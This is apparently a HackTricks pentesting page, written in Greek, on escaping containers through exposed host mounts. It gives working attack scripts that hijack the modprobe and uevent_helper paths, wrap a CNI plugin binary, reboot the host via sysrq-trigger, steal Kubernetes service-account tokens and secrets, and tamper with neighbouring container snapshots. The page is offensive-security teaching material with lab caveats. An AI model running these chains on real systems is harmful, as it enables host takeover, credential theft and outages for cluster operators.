# Ευαίσθητα Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα host mounts είναι μία από τις σημαντικότερες πρακτικές επιφάνειες για container-escape, επειδή συχνά καταργούν την προσεκτικά απομονωμένη προβολή διεργασιών και την επαναφέρουν σε άμεση ορατότητα πόρων του host. Οι επικίνδυνες περιπτώσεις δεν περιορίζονται στο `/`. Τα bind mounts των `/proc`, `/sys`, `/var`, των runtime sockets, της κατάστασης που διαχειρίζεται το kubelet ή paths που σχετίζονται με συσκευές μπορούν να εκθέσουν kernel controls, credentials, filesystems γειτονικών containers και runtime management interfaces.

Αυτή η σελίδα υπάρχει ξεχωριστά από τις επιμέρους σελίδες προστασίας, επειδή το μοντέλο abuse είναι cross-cutting. Ένα writable host mount είναι επικίνδυνο εν μέρει λόγω των mount namespaces, εν μέρει λόγω των user namespaces, εν μέρει λόγω της κάλυψης από AppArmor ή SELinux και εν μέρει λόγω του ακριβούς host path που εκτέθηκε. Η αντιμετώπισή του ως ξεχωριστού θέματος καθιστά την επίθεση πολύ ευκολότερη στην ανάλυση.

## Έκθεση του `/proc`

Το procfs περιέχει τόσο συνηθισμένες πληροφορίες διεργασιών όσο και kernel control interfaces υψηλού αντίκτυπου. Επομένως, ένα bind mount όπως το `-v /proc:/host/proc` ή μια προβολή container που εκθέτει απρόσμενες writable proc entries μπορεί να οδηγήσει σε αποκάλυψη πληροφοριών, denial of service ή άμεση εκτέλεση κώδικα στον host.

Τα procfs paths υψηλής αξίας περιλαμβάνουν:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (ιδιαίτερα τα `register` και `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Ξεκινήστε ελέγχοντας ποιες procfs entries υψηλής αξίας είναι ορατές ή writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Αυτά τα paths είναι ενδιαφέροντα για διαφορετικούς λόγους. Τα `core_pattern`, `modprobe` και `binfmt_misc` μπορούν να γίνουν paths για code execution στο host όταν είναι writable. Τα `kallsyms`, `kmsg`, `kcore` και `config.gz` είναι ισχυρές πηγές reconnaissance για kernel exploitation. Τα `sched_debug` και `mountinfo` αποκαλύπτουν context σχετικά με processes, cgroups και filesystem, το οποίο μπορεί να βοηθήσει στην ανακατασκευή της διάταξης του host από μέσα από το container.

Η πρακτική αξία κάθε path διαφέρει και η αντιμετώπισή τους σαν να είχαν όλα το ίδιο impact δυσκολεύει το triage:

- `/proc/sys/kernel/core_pattern`
Αν είναι writable, είναι ένα από τα procfs paths με το υψηλότερο impact, επειδή ο kernel εκτελεί έναν pipe handler μετά από crash. Ένα container που μπορεί να δείξει το `core_pattern` σε ένα payload αποθηκευμένο στο overlay του ή σε ένα mounted host path μπορεί συχνά να αποκτήσει code execution στο host. Δείτε επίσης το [read-only-paths.md](protections/read-only-paths.md) για ένα ειδικό παράδειγμα.
- `/proc/sys/kernel/modprobe`
Αυτό το path ελέγχει το userspace helper που χρησιμοποιεί ο kernel όταν χρειάζεται να καλέσει logic για τη φόρτωση modules. Αν είναι writable από το container και ερμηνεύεται στο context του host, μπορεί να γίνει ένα ακόμη primitive για code execution στο host. Είναι ιδιαίτερα ενδιαφέρον όταν συνδυάζεται με έναν τρόπο trigger του helper path.
- `/proc/sys/vm/panic_on_oom`
Συνήθως δεν είναι clean escape primitive, αλλά μπορεί να μετατρέψει την πίεση μνήμης σε denial of service σε ολόκληρο το host, μετατρέποντας τις συνθήκες OOM σε συμπεριφορά kernel panic.
- `/proc/sys/fs/binfmt_misc`
Αν το registration interface είναι writable, ο attacker μπορεί να κάνει register έναν handler για μια επιλεγμένη magic value και να αποκτήσει execution στο context του host όταν εκτελείται ένα matching file.
- `/proc/config.gz`
Χρήσιμο για kernel exploit triage. Βοηθά στον προσδιορισμό των ενεργοποιημένων subsystems, mitigations και optional kernel features χωρίς να απαιτούνται metadata των host packages.
- `/proc/sysrq-trigger`
Κυρίως path για denial of service, αλλά πολύ σοβαρό. Μπορεί να κάνει reboot, panic ή να διαταράξει άμεσα με άλλον τρόπο το host.
- `/proc/kmsg`
Αποκαλύπτει μηνύματα από το kernel ring buffer. Χρήσιμο για host fingerprinting, crash analysis και, σε ορισμένα environments, για leaking πληροφοριών που βοηθούν στο kernel exploitation.
- `/proc/kallsyms`
Πολύτιμο όταν είναι readable, επειδή εκθέτει πληροφορίες για τα exported kernel symbols και μπορεί να βοηθήσει στην παράκαμψη υποθέσεων σχετικά με το address randomization κατά την ανάπτυξη kernel exploits.
- `/proc/[pid]/mem`
Αυτό είναι ένα direct interface προς τη μνήμη ενός process. Αν το target process είναι reachable με τις απαραίτητες συνθήκες τύπου ptrace, μπορεί να επιτρέψει την ανάγνωση ή τροποποίηση της μνήμης ενός άλλου process. Το πραγματικό impact εξαρτάται σε μεγάλο βαθμό από τα credentials, τα `hidepid`, το Yama και τους ptrace restrictions, επομένως είναι ένα ισχυρό αλλά conditional path.
- `/proc/kcore`
Εκθέτει μια view της system memory τύπου core-image. Το file είναι τεράστιο και δύσχρηστο, αλλά αν είναι ουσιαστικά readable, υποδεικνύει μια σοβαρά εκτεθειμένη επιφάνεια μνήμης του host.
- `/dev/kmem` και `/dev/mem`
Αυτά είναι ιστορικά interfaces raw-memory **device** με υψηλό impact, όχι αρχεία procfs. Σε πολλά σύγχρονα συστήματα απουσιάζουν ή είναι αυστηρά περιορισμένα, αλλά ένα container που μπορεί να ανοίξει ένα host-mounted αντίγραφό τους πρέπει να θεωρεί την έκθεση critical. Εξετάστε τα μαζί με άλλα sensitive `/dev` mounts αντί να αναζητάτε τα ανύπαρκτα paths `/proc/kmem` ή `/proc/mem`.
- `/proc/sched_debug`
Κάνει leak πληροφορίες για scheduling και tasks, οι οποίες μπορεί να αποκαλύψουν identities processes του host, ακόμη και όταν άλλα process views φαίνονται πιο καθαρά από το αναμενόμενο.
- `/proc/[pid]/mountinfo`
Είναι εξαιρετικά χρήσιμο για την ανακατασκευή του πού βρίσκεται πραγματικά το container στο host, ποια paths υποστηρίζονται από overlay και αν ένα writable mount αντιστοιχεί σε περιεχόμενο του host ή μόνο στο layer του container.

Αν τα `/proc/[pid]/mountinfo` ή οι λεπτομέρειες του overlay είναι readable, χρησιμοποιήστε τα για να ανακτήσετε το host path του filesystem του container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Αυτές οι εντολές είναι χρήσιμες επειδή αρκετά host-execution tricks απαιτούν τη μετατροπή ενός path μέσα στο container στο αντίστοιχο path από την οπτική του host.

### Παράδειγμα: Προετοιμασία ενός `modprobe` Helper Path

Αν το `/proc/sys/kernel/modprobe` είναι writable από το container και το helper path ερμηνεύεται στο context του host, μπορεί να ανακατευθυνθεί σε ένα payload που ελέγχεται από τον attacker. Ο upper directory του overlay πρέπει να επιλυθεί από τον host, και το output της απόδειξης πρέπει να εγγραφεί ξανά στο ίδιο host-visible container layer, αν το container δεν κάνει επίσης mount το host `/tmp`:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Το ακριβές trigger εξαρτάται από τον στόχο και τη συμπεριφορά του kernel και σκόπιμα δεν γίνεται υπόθεση. Επαναφέρετε την αρχική τιμή πριν φύγετε από το lab. Το σημαντικό σημείο είναι ότι μια writable διαδρομή helper μπορεί να ανακατευθύνει μια μελλοντική επίκληση helper από τον kernel σε περιεχόμενο διαδρομής του host που ελέγχεται από τον attacker. Ένα `upperdir` του overlay που λείπει, μια διαδρομή που το host δεν μπορεί να επιλύσει, ένα read-only sysctl mount ή ένας kernel που δεν επικαλείται ποτέ τον επιλεγμένο helper διακόπτει αυτή την αλυσίδα.

### Πλήρες Παράδειγμα: Kernel Recon Με `kallsyms`, `kmsg` Και `config.gz`

Αν ο στόχος είναι η αξιολόγηση exploitability και όχι ένα άμεσο escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Αυτές οι εντολές βοηθούν να απαντηθεί αν είναι ορατές χρήσιμες πληροφορίες συμβόλων, αν τα πρόσφατα μηνύματα του kernel αποκαλύπτουν ενδιαφέρουσα κατάσταση και ποιες δυνατότητες ή mitigations του kernel έχουν γίνει compile. Ο αντίκτυπος συνήθως δεν είναι άμεσο escape, αλλά μπορεί να μειώσει σημαντικά τον χρόνο triage μιας ευπάθειας του kernel.

### Πλήρες Example: Επανεκκίνηση Host μέσω SysRq

Αν το `/proc/sysrq-trigger` είναι εγγράψιμο και έχει πρόσβαση στην προβολή του host:
```bash
echo b > /proc/sysrq-trigger
```
Το αποτέλεσμα είναι άμεσο reboot του host. Δεν πρόκειται για διακριτικό παράδειγμα, αλλά καταδεικνύει ξεκάθαρα ότι η έκθεση του procfs μπορεί να είναι πολύ σοβαρότερη από μια απλή αποκάλυψη πληροφοριών.

## Έκθεση του `/sys`

Το sysfs εκθέτει μεγάλες ποσότητες κατάστασης του kernel και των συσκευών. Ορισμένα paths του sysfs είναι κυρίως χρήσιμα για fingerprinting, ενώ άλλα μπορούν να επηρεάσουν την εκτέλεση helpers, τη συμπεριφορά συσκευών, τη διαμόρφωση των security modules ή την κατάσταση του firmware.

Σημαντικά paths του sysfs περιλαμβάνουν:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Αυτά τα paths είναι σημαντικά για διαφορετικούς λόγους. Το `/sys/class/thermal` μπορεί να επηρεάσει τη συμπεριφορά της thermal management και, επομένως, τη σταθερότητα του host σε περιβάλλοντα με κακή έκθεση. Το `/sys/kernel/vmcoreinfo` μπορεί να leak πληροφορίες σχετικά με crash dumps και τη διάταξη του kernel, οι οποίες βοηθούν στο low-level fingerprinting του host. Το `/sys/kernel/security` είναι το interface του `securityfs` που χρησιμοποιείται από τα Linux Security Modules, επομένως η μη αναμενόμενη πρόσβαση εκεί μπορεί να εκθέσει ή να τροποποιήσει κατάσταση σχετική με το MAC. Τα paths των EFI variables μπορούν να επηρεάσουν ρυθμίσεις boot που υποστηρίζονται από το firmware, γεγονός που τα καθιστά πολύ σοβαρότερα από τα συνηθισμένα configuration files. Το `debugfs` στο `/sys/kernel/debug` είναι ιδιαίτερα επικίνδυνο, επειδή αποτελεί σκόπιμα developer-oriented interface με πολύ λιγότερες απαιτήσεις ασφάλειας από τα hardened kernel APIs που προορίζονται για production.

Κάθε καταχώριση sysfs σε αυτήν τη λίστα εξαρτάται από τον **kernel, τη διαμόρφωση και το hardware**. Τα τρέχοντα virtualized nodes συχνά δεν περιλαμβάνουν καθόλου τα `uevent_helper`, τις EFI variables και τις thermal-device entries. Καταγράψτε ένα path που απουσιάζει ως αρνητική προϋπόθεση, αντί να θεωρείτε ότι ισχύει ένα παράδειγμα από διαφορετικό kernel.

Χρήσιμες εντολές ελέγχου για αυτά τα paths είναι:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Τι κάνει αυτές τις εντολές ενδιαφέρουσες:

- Το `/sys/kernel/security` μπορεί να αποκαλύψει αν το AppArmor, το SELinux ή κάποιο άλλο LSM surface είναι ορατό με τρόπο που θα έπρεπε να παραμένει αποκλειστικά στο host.
- Το `/sys/kernel/debug` είναι συχνά το πιο ανησυχητικό εύρημα σε αυτή την ομάδα. Αν το `debugfs` είναι mounted και readable ή writable, αναμένεται ένα ευρύ kernel-facing surface, του οποίου ο ακριβής κίνδυνος εξαρτάται από τα ενεργοποιημένα debug nodes.
- Η έκθεση των EFI variables είναι λιγότερο συνηθισμένη, αλλά αν υπάρχει έχει υψηλό impact, επειδή αφορά firmware-backed settings και όχι συνηθισμένα runtime files.
- Το `/sys/class/thermal` αφορά κυρίως τη σταθερότητα του host και την αλληλεπίδραση με το hardware, όχι ένα neat shell-style escape.
- Το `/sys/kernel/vmcoreinfo` είναι κυρίως πηγή host-fingerprinting και crash analysis, χρήσιμη για την κατανόηση του low-level kernel state.

### Πλήρες Παράδειγμα: `uevent_helper`

Το `/sys/kernel/uevent_helper` εξαρτάται από τον kernel και το configuration και απουσιάζει από πολλά σύγχρονα συστήματα. Αν υπάρχει, είναι writable και υπάρχει διαθέσιμο ένα usable `uevent` trigger, ο kernel μπορεί να εκτελέσει ένα attacker-controlled helper. Το proof output πρέπει να χρησιμοποιεί ένα path που είναι visible τόσο από την οπτική του host όσο και από την οπτική του container:
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
Ο λόγος για τον οποίο αυτό λειτουργεί είναι ότι το helper path ερμηνεύεται από την οπτική του host. Μόλις ενεργοποιηθεί, το helper εκτελείται στο context του host και όχι μέσα στο τρέχον container. Το `/sys/class/mem/null/uevent` είναι ένα συγκεκριμένο trigger σε kernels που το εκθέτουν· άλλες συσκευές μπορεί να εκθέτουν τα δικά τους αρχεία `uevent`, αλλά μην επιλέγετε κάποιο τυφλά σε πραγματικό hardware. Επαναφέρετε την αρχική τιμή πριν αποχωρήσετε από το lab. Μην αναφέρετε αυτή την τεχνική ως διαθέσιμη όταν απουσιάζει το αρχείο του helper ή ένα ελεγχόμενο trigger.

## Έκθεση του `/var`

Το mounting του `/var` του host σε ένα container συχνά υποτιμάται, επειδή δεν φαίνεται τόσο δραματικό όσο το mounting του `/`. Στην πράξη, μπορεί να αρκεί για την πρόσβαση σε runtime sockets, directories με container snapshots, volumes pods που διαχειρίζεται το kubelet, projected service-account tokens και filesystems γειτονικών εφαρμογών. Σε σύγχρονους nodes, το `/var` είναι συχνά το σημείο όπου βρίσκεται το πιο ενδιαφέρον από επιχειρησιακής άποψης container state.

### Kubernetes Παράδειγμα

Ένα pod με `hostPath: /var` μπορεί συχνά να διαβάσει projected tokens άλλων pods και περιεχόμενο overlay snapshots:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες, επειδή δείχνουν αν το mount εκθέτει μόνο ασήμαντα δεδομένα εφαρμογής ή credentials του cluster υψηλού αντίκτυπου. Ένα αναγνώσιμο service-account token μπορεί να μετατρέψει άμεσα την τοπική εκτέλεση κώδικα σε πρόσβαση στο Kubernetes API.

Αν υπάρχει το token, επικυρώστε τι μπορεί να προσεγγίσει αντί να σταματήσετε στην ανακάλυψη του token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Ο αντίκτυπος εδώ μπορεί να είναι πολύ μεγαλύτερος από την πρόσβαση σε έναν τοπικό node. Ένα token με ευρεία RBAC μπορεί να μετατρέψει ένα προσαρτημένο `/var` σε compromise ολόκληρου του cluster.

### Παράδειγμα Docker και containerd

Σε Docker hosts, τα σχετικά δεδομένα βρίσκονται συχνά στο `/var/lib/docker`, ενώ σε Kubernetes nodes που βασίζονται στο containerd μπορεί να βρίσκονται στο `/var/lib/containerd` ή σε paths ειδικά για το snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Εάν το προσαρτημένο `/var` εκθέτει εγγράψιμα περιεχόμενα snapshot ενός άλλου workload, ο attacker ενδέχεται να μπορεί να τροποποιήσει αρχεία εφαρμογών, να τοποθετήσει web content ή να αλλάξει startup scripts χωρίς να αγγίξει την τρέχουσα ρύθμιση του container.

Σε ένα **disposable lab workload**, τα εγγράψιμα περιεχόμενα snapshot μπορούν να καταδείξουν tampering εφαρμογής, ανάκτηση secrets ή lateral movement. Αντιστοιχίστε πρώτα το runtime container ID στο ακριβές snapshot και μην επεξεργάζεστε ποτέ ένα άσχετο ή production snapshot:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Αυτές οι εντολές είναι χρήσιμες επειδή δείχνουν τις τρεις κύριες οικογένειες επιπτώσεων των mounted `/var`: παραποίηση εφαρμογών, ανάκτηση secrets και lateral movement σε γειτονικά workloads.

Οι άμεσες εγγραφές snapshot παρακάμπτουν τη συνήθη διαχείριση κατάστασης του runtime και μπορούν να καταστρέψουν το container ή να διαγράψουν στοιχεία. Η read-only ανακάλυψη αναπαράχθηκε τοπικά σε Docker `overlay2`: ένας marker που γράφτηκε σε ένα γειτονικό disposable container εμφανίστηκε κάτω από το `/var/lib/docker/overlay2/<id>/diff/`. Περιορίστε την πραγματική τροποποίηση snapshot σε ένα disposable container που δημιουργήθηκε για αυτό το test.

## Κατάσταση Kubelet, Plugins και CNI Paths

Ένα mount των `/var/lib/kubelet`, `/opt/cni/bin` ή `/etc/cni/net.d` συχνά εκτίθεται μέσω privileged DaemonSets, CNI agents, CSI node plugins, GPU operators και storage helpers. Αυτά τα mounts είναι εύκολο να απορριφθούν ως "node plumbing", αλλά βρίσκονται απευθείας στη διαδρομή εκτέλεσης για νέα pods και συχνά περιέχουν kubelet credentials, projected secrets, registration sockets και executable host-side plugin binaries.

Οι στόχοι υψηλής αξίας περιλαμβάνουν:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Χρήσιμες εντολές ελέγχου είναι:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Γιατί αυτές οι διαδρομές έχουν σημασία:

- Το `/var/lib/kubelet/pki` μπορεί να εκθέσει client certificates του kubelet και άλλα node-local credentials, τα οποία μερικές φορές μπορούν να επαναχρησιμοποιηθούν έναντι του API server ή των TLS endpoints που εξυπηρετούν το kubelet, ανάλογα με τον σχεδιασμό του cluster.<sup>[[1]](#references)</sup>
- Το `/var/lib/kubelet/pods` συχνά περιέχει projected service-account tokens και mounted Secrets για γειτονικά pods στο ίδιο node.
- Το `/var/lib/kubelet/pod-resources/kubelet.sock` είναι κυρίως επιφάνεια reconnaissance, αλλά ιδιαίτερα χρήσιμη: αποκαλύπτει ποια pods και containers κατέχουν επί του παρόντος GPUs, hugepages, συσκευές SR-IOV και άλλους σπάνιους node-local πόρους.<sup>[[1]](#references)</sup>
- Τα `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` και `/var/lib/kubelet/plugins_registry` αποκαλύπτουν ποια CSI, DRA και device plugins είναι εγκατεστημένα και με ποια sockets αναμένεται να επικοινωνεί το kubelet. Αν αυτοί οι κατάλογοι είναι writable και όχι απλώς readable, το εύρημα γίνεται πολύ σοβαρότερο.<sup>[[1]](#references)</sup>
- Τα `/opt/cni/bin` και `/etc/cni/net.d` βρίσκονται απευθείας στη διαδρομή setup του pod network. Η writable πρόσβαση εκεί αποτελεί συχνά delayed host-execution primitive και όχι απλώς έκθεση configuration.<sup>[[2]](#references)</sup>

### Πλήρες Παράδειγμα: Writable `/opt/cni/bin`

Αν ένας host CNI binary directory γίνει mounted read-write, η αντικατάσταση ενός plugin μπορεί να είναι αρκετή για την απόκτηση host execution την επόμενη φορά που το kubelet δημιουργεί ένα pod sandbox σε αυτό το node:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Αυτό δεν είναι τόσο άμεσο όσο ένα mounted `docker.sock`, αλλά είναι συχνά πιο ρεαλιστικό σε compromised Kubernetes infrastructure pods. Το marker γράφεται δίπλα στο mounted plugin, ώστε το container να μπορεί να το ανακτήσει ακόμη και χωρίς host-root ή host-`/tmp` mount. Το wrapper διατηρεί τα αρχικά arguments και το standard input και, στη συνέχεια, το παράδειγμα επαναφέρει το αρχικό binary. Το σημαντικό σημείο είναι ότι το τροποποιημένο binary εκτελείται αργότερα από τη ροή ρύθμισης του host network και όχι από το τρέχον container. Χρησιμοποιήστε μόνο disposable node, επειδή ένα μη έγκυρο wrapper μπορεί να εμποδίσει τα νέα Pod sandboxes από το να αποκτήσουν networking.

## Runtime Sockets

Τα sensitive host mounts συχνά περιλαμβάνουν runtime sockets αντί για ολόκληρους καταλόγους. Είναι τόσο σημαντικά, ώστε αξίζει να επαναληφθούν ρητά εδώ:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Δείτε το [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) για πλήρεις ροές exploitation μόλις γίνει mount ένα από αυτά τα sockets.

Ως ένα γρήγορο αρχικό interaction pattern:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.

## Writable Host Path Task Hijack

Ένα writable host mount δεν χρειάζεται να εκθέτει το `/` για να είναι επικίνδυνο. Αν το mounted path περιέχει scripts, αρχεία config, hooks, plugins ή αρχεία που καταναλώνονται αργότερα από ένα host-side scheduled task ή service, το container ενδέχεται να μπορεί να αλλάξει αυτό που εκτελεί το host.

Γενική ροή ελέγχου:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Εάν ένα εγγράψιμο αρχείο χρησιμοποιείται από μια διεργασία του host, διατηρήστε το payload απλό και παρατηρήσιμο κατά τη δοκιμή:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Το ενδιαφέρον σημείο είναι το trust boundary: η εγγραφή πραγματοποιείται μέσα από το container, αλλά η εκτέλεση γίνεται αργότερα στο context της υπηρεσίας του host. Αυτό μετατρέπει ένα περιορισμένο hostPath ή bind mount σε primitive για καθυστερημένη εκτέλεση κώδικα στον host.

## CVEs που σχετίζονται με mounts

Τα host mounts σχετίζονται επίσης με vulnerabilities των runtimes. Σημαντικά πρόσφατα παραδείγματα περιλαμβάνουν:

- Το `CVE-2024-21626` στο `runc`, όπου ένα leaked directory file descriptor μπορούσε να τοποθετήσει το working directory στο filesystem του host.
- Τα `CVE-2024-23651`, `CVE-2024-23652` και `CVE-2024-23653` στο BuildKit, όπου κακόβουλα Dockerfiles, frontends και ροές `RUN --mount` μπορούσαν να επαναφέρουν την πρόσβαση σε αρχεία του host, τη διαγραφή τους ή elevated privileges κατά τη διάρκεια των builds.
- Το `CVE-2024-1753` στα Buildah και Podman build flows, όπου crafted bind mounts κατά τη διάρκεια του build μπορούσαν να εκθέσουν το `/` με read-write πρόσβαση.
- Το `CVE-2025-47290` στο `containerd` 2.1.0, όπου ένα TOCTOU κατά το image unpack μπορούσε να επιτρέψει σε ένα specially crafted image να τροποποιήσει το filesystem του host κατά το pull.

Αυτά τα CVEs είναι σημαντικά εδώ, επειδή δείχνουν ότι το mount handling δεν αφορά μόνο τη ρύθμιση από τον operator. Το ίδιο το runtime μπορεί επίσης να εισαγάγει escape conditions που προκαλούνται από mounts.

## Έλεγχοι

Χρησιμοποιήστε αυτές τις εντολές για να εντοπίσετε γρήγορα τις εκθέσεις mounts με τη μεγαλύτερη αξία:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Τι είναι ενδιαφέρον εδώ:

- Το host root, τα `/proc`, `/sys`, `/var` και τα runtime sockets αποτελούν ευρήματα υψηλής προτεραιότητας.
- Οι εγγραφές proc/sys με δυνατότητα εγγραφής συχνά σημαίνουν ότι το mount εκθέτει global ελέγχους του kernel σε επίπεδο host, αντί για μια ασφαλή προβολή του container.
- Τα mounted paths κάτω από `/var` απαιτούν έλεγχο credentials και γειτονικών workloads, όχι μόνο έλεγχο του filesystem.
- Οι κατάλογοι κατάστασης του Kubelet και τα paths του CNI/plugin απαιτούν την ίδια προτεραιότητα με τα runtime sockets, επειδή συχνά βρίσκονται απευθείας στη διαδρομή δημιουργίας pods και διανομής credentials του node.

## Κατάσταση τοπικής επικύρωσης

Οι πρακτικές αλυσίδες σε αυτή τη σελίδα ελέγχθηκαν σε έναν τοπικό Linux minikube node. Η επικύρωση αναπαρήγαγε:

- πρόσβαση ανάγνωσης και εγγραφής μέσω ενός προσωρινού writable hostPath
- ανακάλυψη projected ServiceAccount tokens και mounted Secrets μέσω του `/var/lib/kubelet/pods`
- επιτυχή authentication στο Kubernetes API με ένα ενεργό token που ανακτήθηκε από το mounted kubelet state
- read-only ανακάλυψη ενός neighboring Docker `overlay2` filesystem μέσω mounted `/var`
- δημιουργία sibling container μέσω του Docker API, με read-only host bind μέσω ενός mounted `docker.sock`
- delayed εκτέλεση στον host μέσω ενός προσωρινού hook που καταναλώνεται από τον host
- προσομοίωση CNI-wrapper που διατήρησε τα arguments, το standard input και την εκτέλεση του αρχικού plugin

